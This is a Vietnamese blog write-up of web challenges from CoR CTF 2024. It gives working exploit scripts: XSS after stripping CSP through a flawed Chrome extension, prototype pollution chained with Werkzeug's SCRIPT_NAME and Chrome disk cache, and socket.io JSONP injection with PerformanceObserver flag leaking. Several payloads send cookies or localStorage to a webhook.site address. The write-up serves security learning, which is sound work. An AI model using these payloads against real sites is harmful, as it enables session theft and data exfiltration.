---
title: "CoR CTF 2024"
description: "CoR CTF 2024"
summary: "CoR CTF 2024"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2024-07-29
draft: false
authors:
  - Shin24
---

![image](https://github.com/user-attachments/assets/4782fee7-ae9b-427d-9d22-dff266ee2ee1)

Ở giải này mình làm được **3/6** bài, 3 bài còn lại có số solve lần lượt 2,1 và 0... Ở đây mình sẽ viết writeup ngắn cho 1 bài mình làm được và 3 bài chưa solve được nhằm ép mình ngồi học, bắt đầu nào

## corctf-challenge-dev

![image](https://github.com/user-attachments/assets/c3016b37-8ee7-4fa7-b453-9afa13ba789c)

Context của bài là ta có một bug XSS nhưng không thể bypass được CSP, ta sẽ lợi dụng một lỗi trong chrome extension của bài cho phép ta ghi dynamic rule vào `declarativenetrequest` nhằm xóa đi header CSP và thực hiện XSS

![image](https://github.com/user-attachments/assets/01d148a9-8e1f-466d-b0e6-60a2e2fe0d23)

`document.getElementById('block-options')` sẽ lấy phần tử đầu tiên với id `block-options` mà nó tìm thấy, do đó nếu extension đặt form ở đầu tag `body` thì ta chỉ việc đặt form của ta ở tag `head`, sau đó trigger button `submit-btn` là được. Rule của ta sẽ được merge vào `base_rule` và được register vào dynamic rules của `declarativenetrequest`

![image](https://github.com/user-attachments/assets/0e9a1bb0-e703-4ce9-8db6-e71a816ec8e3)

Hàm `serializeForm` như sau:

![image](https://github.com/user-attachments/assets/89029748-8609-45d3-a947-96987d384b3e)

Vậy chỉ cần form data của ta có key dạng `action.type` là sẽ có thể ghi đè được giá trị của `type`, đối với array thì là `a.b.0.c`. Tới đây ta có thể ghi một rule với action `modifyHeaders` (https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest#header_modification) để xóa đi CSP header, từ đó ta có thể thực hiện XSS để lấy cookie. 

```html
<head></head>
<body>
</body>
<script>
    const payload = `
    <header>
    <div class="modal-content">
        <span class="close">&times;</span>
        <form name="aaa" id='block-options'>
            <input type='text' id='priority' name='priority' value='2'>
            <input type='text' id='1' name='action.type' value='modifyHeaders'>
            
            <input type='text' id='a2a' name='action.responseHeaders.0.header' value='content-security-policy'>
            <input type='text' id='a3a' name='action.responseHeaders.0.operation' value='remove'>
            <input type='text' id='a4a' name='condition.resourceTypes.0' value='main_frame'>

            <input type='text' id='a5a' name='action.requestHeaders.0.header' value='user-agent'>
            <input type='text' id='a6a' name='action.requestHeaders.0.operation' value='remove'>
            
            <input type='text' id='a8a' name='condition.resourceTypes.0' value='main_frame'>
            <input type='text' id='a9a' name='condition.resourceTypes.1' value='sub_frame'>
            <input type='text' id='a0a' name='condition.resourceTypes.2' value='script'>
            <input type='text' id='a11a' name='condition.resourceTypes.3' value='other'>
            <input type='text' id='a22a' name='condition.resourceTypes.4' value='webtransport'>
            <input type='text' id='a33a' name='condition.resourceTypes.5' value='xmlhttprequest'>

            <input type='text' id='a44a' name='condition.initiatorDomains.0' value='localhost'>
        </form>
        </div>
    </header>
    `;

    
    document.querySelector("head").innerHTML = payload;
    setTimeout(async () => {
        document.querySelector("#submit-btn").click();
        await new Promise(r => setTimeout(r, 1000));
        open("/open.html")
    } , 2000)
    
</script>

<!-- <meta http-equiv="refresh" content="1; url=http://localhost:8080/challenge/3175c1a754da"> -->

<!-- <script>window.location="https://webhook.site/xxx/?c="+btoa(document.cookie) </script> -->
```

`open.html`:

```html
<script>
    setTimeout(() => {
        location.href="http://localhost:8080/challenge/8f63f212e1f6";
    }, 1000);

</script>
```

Đầu tiên ta sẽ trigger ghi rule vào `chrome.storage.local`, sau đó thực hiện truy cập vào trang 1 lần nữa để background script của extension thực hiện register rule này

![image](https://github.com/user-attachments/assets/24503b29-9ce4-4550-a52b-36cd25f43d27)

Mình tạo 2 note, 1 note chứa payload XSS và 1 note chứa payload redirect qua note còn lại, mục đích là để thỏa mãn điều kiện `initiatorDomains` do mình để là `http://localhost:8080`, ghi thực hiện redirect từ note 1 qua note 2 thì initiator sẽ là `http://localhost:8080` => điều kiện thỏa => CSP header bị remove => XSS

FLAG: `corctf{i_was_going_to_find_a_bug_in_ublock_but_it_was_easier_to_just_write_my_own_broken_extension}`

## Iframe-note

![image](https://github.com/user-attachments/assets/d1f5c0ce-7ee9-4f17-82c0-26286e7582c2)

Ở bài này ta sẽ chain client-side prototype pollution với một "tính năng" của werkzeug và sau đó abuse chrome disk cache để XSS

### Clide-side Prototype pollution

![image](https://github.com/user-attachments/assets/3ac9120f-38b0-4cda-824b-1e8c86c6c20d)

![image](https://github.com/user-attachments/assets/8d3d8ed1-1b9a-4523-95cc-cf16a2d3ab75)

![image](https://github.com/user-attachments/assets/eea23b04-9098-4211-8c6f-0c9719607c39)

Phần bypass thì khá dễ, canjs thực hiện url decode trước khi thực hiện parse query string nên ta chỉ cần thay `__proto__` thành `__%70roto__`, đến đây thì mình bắt đầu đi tìm gadget trong axios, sài 1 tiếng mò mẫm thì có vẻ không có gadget nào cho phép ta ngay lập tức XSS được, mình đổi hướng sang việc control request gửi đi của axios để chain với một bug nào đó ở server side, giống như hint của author:

![image](https://github.com/user-attachments/assets/cd371e13-f998-466f-8431-b5447def5fff)

### Werkzeug

Lúc đầu thì mình nghĩ là có thể có một bug nào đó giống bug của Kevin mizu (https://github.com/pallets/werkzeug/issues/2833), từ đó ta có thể làm chrome cache lại request với url của `/view/xxxxx` nhưng nội dung thì có chèn payload XSS vào, client side desync. Thế là mình bắt đầu ngồi tìm variations của bug này trong source của Werkzeug, nhưng mà cũng không tìm thấy gì nốt. Cuối cùng kết quả là Werkzeug có một header là `SCRIPT_NAME` cho phép control base URL của `url_for`

![image](https://github.com/user-attachments/assets/210ebd3f-5ce2-42a4-8d37-513c30569beb)

Thật ra cái này mình đã tìm ra từ đợt KCSC 2024, nhưng mà lâu quá không sài lại quên, khá cay... Anyway, từ đó ta có thể control được base url của script. 

![image](https://github.com/user-attachments/assets/d12d4c02-2698-4b49-97c1-0a469280ab8d)

Tuy nhiên thì đó chỉ là response được gửi về từ XHR, vậy làm sao để XSS? Đó là ta sẽ abuse chrome disk cache

### Chrome disk cache 

Chrome có 2 loại cache chính là bf cache và disk cache:
- back/forward cache (bf cache): cache lại snapshot hoàn chỉnh của page, trạng thái lúc đó ra sao đều sẽ được cache lại và sẽ được serve khi user back/forward trang
- disk cache: chứa các resource được fetch về của trang, nhưng không kèm theo JavaScript heap, nghĩa là các script sẽ được execute lại. Được dùng trong một số trường hợp thay thế bf cache

More at: https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote

Khi ta cho chrome thực hiện XHR request thì response được được cache lại, đưa vào disk cache, ta chỉ cần trigger disk cache khi back history lại là được

### Exploit

Nhìn vào source của axios ta sẽ biết có 3 adapter mà axios dùng để gửi request là `XHR`, `http` và `fetch`. 

![image](https://github.com/user-attachments/assets/6ec5540d-f982-4e99-bd2f-da7b0d0d4a96)

Nếu context là ở browser, axios sẽ prefer `XHR` hơn

![image](https://github.com/user-attachments/assets/2cc53f7e-8f5d-4797-9485-31a990484db9)

Ta sẽ dùng prototype pollution để control header lúc gửi đi của XHR và `baseURL` của axios

![image](https://github.com/user-attachments/assets/b3512af2-98b1-4d0f-ae8e-78cb7ea987c4)

payload sẽ như sau:

```
?__%70roto__[headers][SCRIPT_NAME]=data:text/javascript,alert(1)&__%70roto__[baseURL]=data:text/javascript,alert(1)/
```

Sau khi response đã có trong cache ta có thể trigger disk cache để xss, đầu tiên thì khi page được open bởi `window.open` thì chrome sẽ ưu tiên sử dụng disk cache thay vì bfcache, full script của player `@_arkark`

```html
<body>
  <script>
    // const BASE_URL = "http://localhost:3000";
    const BASE_URL = "https://iframe-note.be.ax";

    const HOOK_URL = "https://webhook.site/xxxxx";

    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

    const main = async () => {
      const dataUrl = `data:text/javascript,navigator.sendBeacon('${HOOK_URL}',JSON.stringify(localStorage))`;

      const win = open(`${BASE_URL}/${dataUrl}/iframe/view`);
      await sleep(1000);

      win.location = `${BASE_URL}/view?id=view&__%70roto__[headers][SCRIPT_NAME]=${dataUrl}/iframe&__%70roto__[baseURL]=/${dataUrl}/`;
      await sleep(1000);

      win.location = `${location.origin}/back.html?n=2`;
    };
    main();
  </script>
</body>
```

`back.html`:

```html
<script>
    const n = parseInt(new URLSearchParams(location.search).get("n"));
    history.go(-n);
</script>
```

Đầu tiên ta sẽ cho browser open 1 tab mới và truy cập đến `/data:text/javascript,alert(1)/iframe/view` để tạo 1 entry history, tiếp đó redirect tab đó đến URL chứa payload ở query string nhằm pollute prototype `Object` và fetch đến `/data:text/javascript,alert(1)/iframe/view`, lúc này thì ban đầu ta đã có một history của url `/data:text/javascript,alert(1)/iframe/view` rồi, cộng với việc response khi fetch đến `/data:text/javascript,alert(1)/iframe/view` lần này khác với lần đầu nếu browser sẽ invalidate cache cũ và đẩy cache mới vào, lúc này ta chỉ cần `history.go(-2)` để lùi history về 2 entry (entry của `/data:text/javascript,alert(1)/iframe/view`) và trigger disk cache đã lưu để trang được render và các script sẽ bắt đầu chạy
## corchat x 

![image](https://github.com/user-attachments/assets/375f2567-c3f4-4edc-a546-a85cbfd40db8)

Another shadow dom challenge, một ứng dụng chat sử dụng socket, ta sẽ cần bằng cách nào đó exfiltrate được flag nằm trong `src` của tag `img` bên trong một shadow dom và nằm trong một `about:blank` origin được mở bằng `window.open`

Core concept của bài này đó là engine.io (engine được sử dụng bởi socket.io) sử dụng JSONP để broadcast message đến các socket

![image](https://github.com/user-attachments/assets/778857dd-17d6-46cf-b90e-f4524ead590c)

Cùng nhìn qua CSP của bài 

![image](https://github.com/user-attachments/assets/27e54170-49f0-4d12-b39b-18990babdcec)

Vậy ta có thể dùng cách `<script src="/socket.io/?EIO=4&transport=polling&t=bingus&sid=<sid>&j=0"></script>`

### JSONP

JSONP là giải pháp để truyền tải JSON và "bypass" qua SOP, consumer chỉ cần setup 1 thẻ script trỏ src đến API endpoint, API endpoint này sẽ trả về một response chứa một đoạn JSON được wrap bởi một đoạn JS dùng để sử lý đoạn JSON đó. Cách này tiện cho cả developer và attack khi mà nó đã từng nhiều lần được sử dụng để bypass CSP:

```html
<script+src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
```

Với payload như trên ta sẽ bypass qua được các CSP dạng `script-src 'self' https://*.google.com/`. Vậy quay lại bài trên, ta có thể thiết lập một socket connection, lấy sid thế vào URL bên trên kia rồi trỏ script src vào, nhưng như thế thì chưa đủ vì theo lẽ thông thường thì JSON sẽ được escape nên ta cũng không thể chèn JS vào trong đoạn JSONP được... nhưng trường hợp của engineio thì khác, cùng quan sát khi mình gửi `\" aaa`

![image](https://github.com/user-attachments/assets/33c9ddf3-efcf-4a42-adf0-4f8d0f9af0ed)

Mình sẽ simulate lại sau khi data đi qua 1 hàm unescape: 

![image](https://github.com/user-attachments/assets/7965e476-e920-424c-8d5e-a1b7af9abb0d)

Khá rõ ràng, dấu `\` ban nãy dường như đã bị engineio escape sai, vậy làm sao để ta lợi dùng điều này? Tạo 2 socket session, emit payload ở `\" + alert(1));` ở session 1, session 2 sẽ dùng để trỏ script src đến polling endpoint của socketio, cụ thể như sau (original author: `Trixter`)

```py
import socketio
import requests
import time
import json

base_url = "http://localhost:8080"

def create_sid():
    session = requests.Session()
    login = session.post(f'{base_url}/', data = {}, allow_redirects=False)
    assert login.status_code == 302, login.status_code

    res = session.get(f'{base_url}/socket.io/', params = {
        'EIO': 4,
        'transport': 'polling',
        't': 'bingus',
    })
    assert res.status_code == 200, res.status_code

    socket_session = json.loads(res.text[1:])
    print('fake session', socket_session)

    res = session.post(f'{base_url}/socket.io/', params = {
        'EIO': 4,
        'transport': 'polling',
        't': 'P3qHGUZ',
        'sid': socket_session['sid'],
    }, data = b'40')
    assert res.status_code == 200, res.status_code

    return socket_session['sid']

bot_session = requests.Session()
login = bot_session.post(f'{base_url}/', data = {
    'name': 'FizzBuzz101',
}, allow_redirects=False)
assert login.status_code == 302, login.status_code

sio = socketio.Client(http_session=bot_session)
ready = False

@sio.event
def connect():
    global ready

    print('connected!')

    # fake disconnect event so that the bot can connect as well
    sio.emit('disconnect')
    time.sleep(1)
    ready = True
    print('ready for bot!')

@sio.event
def message(data):
    global ready

    if not ready:
        return

    print('message', data)
    if data['content'] == 'FizzBuzz101 joined.': # XSS bot opened the chat
        sid = create_sid()
        jsonp_url = f'{base_url}/socket.io/?EIO=4&transport=polling&t=bingus&sid={sid}&j=0'
        js_payload = "(alert(origin))"

        sio.emit('message', '\\"+'+js_payload+');//')

        xss_payload = """
<a id=&quot;___eio&quot;></a>
<script src=&quot;%s&quot;></script>
""" % jsonp_url
        chat_message = '<iframe id="xss" srcdoc="%s"></iframe>' % xss_payload.strip()
        sio.emit('message', chat_message)

sio.connect(base_url)
sio.wait()
```

trước khi emit lần 2, ta wrap payload vào trong `srcdoc` của iframe để tag `script` có thể chạy, đối với dòng `<a id=&quot;___eio&quot;></a>` thì mục đích là để thông qua DOM clobbering khởi tạo biến `__eio` để khi chạy payload sẽ không bị báo lỗi vì lúc này `__eio` chưa được khai báo (smart :O)

![image](https://github.com/user-attachments/assets/9b7f7a1a-d627-47bc-a539-78649cadbfa2)

### Leaking flag with PerformanceObserver

Trong giải mình có attemp bài này và hướng của mình là thông qua CSS để để leak flag, do đó mà mình đọc spec cũng như source chromium thì mình có tìm ra được là có một CSS combinator gọi là `/deep/` có khả năng chọc xuyên Shadow DOM, nhưng từ sớm đã bị deprecated và removed khỏi google chrome, shame. Quay trở lại bài, original solution của `Trixter` đã split XSS thành 2 stage để bypass qua giới hạn độ dài payload 400 bytes, stage 1 thực hiện `open('', 'secret')` để lấy reference đến tab `secret` chứa flag, tiếp theo là tiếp tục include script của stage 2. Ở stage 2 thì `Trixter` sử dụng một API là `PerformanceObserver` để để leak flag thông qua việc truy xuất vào url của các resource entry

![image](https://github.com/user-attachments/assets/50d32afd-7ed6-4c5d-a75c-325bbcd3c766)

API này cho phép ta truy cập vào tất cả các resource đã load cũng như các thông số về performance khi load của resource đó (quite powerful), full script:

```py
import socketio
import requests
import time
import json

base_url = "http://localhost:8080"

def create_sid():
    session = requests.Session()
    login = session.post(f'{base_url}/', data = {}, allow_redirects=False)
    assert login.status_code == 302, login.status_code

    res = session.get(f'{base_url}/socket.io/', params = {
        'EIO': 4,
        'transport': 'polling',
        't': 'bingus',
    })
    assert res.status_code == 200, res.status_code

    socket_session = json.loads(res.text[1:])
    print('fake session', socket_session)

    res = session.post(f'{base_url}/socket.io/', params = {
        'EIO': 4,
        'transport': 'polling',
        't': 'P3qHGUZ',
        'sid': socket_session['sid'],
    }, data = b'40')
    assert res.status_code == 200, res.status_code

    return socket_session['sid']

bot_session = requests.Session()
login = bot_session.post(f'{base_url}/', data = {
    'name': 'FizzBuzz101',
}, allow_redirects=False)
assert login.status_code == 302, login.status_code

sio = socketio.Client(http_session=bot_session)
ready = False

@sio.event
def connect():
    global ready

    print('connected!')

    # fake disconnect event so that the bot can connect as well
    sio.emit('disconnect')
    time.sleep(1)
    ready = True
    print('ready for bot!')

@sio.event
def message(data):
    global ready

    if not ready:
        return

    print('message', data)
    if data['content'] == 'FizzBuzz101 joined.': # XSS bot opened the chat
        first_sid = create_sid()
        js_payload = """
(window.exfil = data => window.top.opener.top.socket.emit('message', data))
(window.observer = new parent.PerformanceObserver((list) => { list.getEntries().forEach((entry) => { window.exfil('Flag: ' + decodeURIComponent(entry.name.split('/').pop())); }); }))
(window.observer.observe({ type: 'resource', buffered: true }))
""".strip().replace('\n', ',')
        sio.emit('message', '\\"+'+js_payload+');//')

        second_sid = create_sid()
        jsonp_url = f'{base_url}/socket.io/?EIO=4&transport=polling&t=bingus&sid={second_sid}&j=0'
        js_payload = """
(window.secret=window.open('','secret'))
(window.a=window.top.document.getElementById('xss').cloneNode())
(window.a.srcdoc=window.a.srcdoc.replace('%s','%s'))
(window.secret.document.body.appendChild(window.a))
""".strip().replace('\n', ',') % (second_sid, first_sid)

        sio.emit('message', '\\"+'+js_payload+');//')

        xss_payload = """
<a id=&quot;___eio&quot;></a>
<a id=&quot;___eio&quot;></a>
<script src=&quot;%s&quot;></script>
""" % jsonp_url
        chat_message = '<iframe id="xss" srcdoc="%s"></iframe>' % xss_payload.strip()
        assert len(chat_message) < 400, 'chat message too long, time to write better payload'
        sio.emit('message', chat_message)

sio.connect(base_url)
sio.wait()
```

![image](https://github.com/user-attachments/assets/d947da00-c9e4-4d52-b86e-1b34f37c8a77)

## repayment-pal (PENDING)
